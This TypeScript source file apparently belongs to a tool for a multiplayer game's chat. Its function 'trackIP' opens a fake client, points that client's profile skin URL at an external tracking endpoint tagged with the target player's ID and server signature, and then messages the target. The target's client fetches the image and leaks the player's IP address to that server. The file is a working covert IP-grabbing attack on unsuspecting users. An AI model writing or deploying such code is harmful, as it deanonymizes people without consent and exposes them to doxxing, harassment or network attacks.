import { logger } from './logger';
import config from '../../config.json';
import { ProfileManager } from '../chat/managers/profile';
import { WebSocketWrapper } from './../chat/index';
import { MessageManager } from './../chat/managers/message';
import { PlayerManager } from './../chat/managers/player';
import { UserInfo } from './../types/responses/types/UserInfo';
import { env } from './env';

export const trackIP = async (socket: WebSocketWrapper, player: UserInfo) => {
	const wrapper = new WebSocketWrapper(socket.getEndpoint(), socket.getServerSignature());

	const playerManager = new PlayerManager(wrapper);
	const messageManager = new MessageManager(wrapper);
	const profileManager = new ProfileManager(wrapper);

	const sender = wrapper.getSender();

	wrapper.on('open', () => {
		sender.join();
	});

	wrapper.on('connect', () => {
		logger.verbose('fake client connected.');

		const ip = env.IX_AGAR_STAT_ENDPOINT;

		// ip tracking setup
		profileManager.updateProfile({
			...profileManager.getProfile(),
			skinUrl: `${ip}/image.png?serverSig=${player.serverSig}&userId=${player.userId}&timestamp=${Date.now()}`,
		});

		// ip tracking
		messageManager.message(player.userId, config.message.cheat);

		setTimeout(() => {
			logger.verbose('fake client closed.');
			wrapper.close();
		}, 10000);
	});

}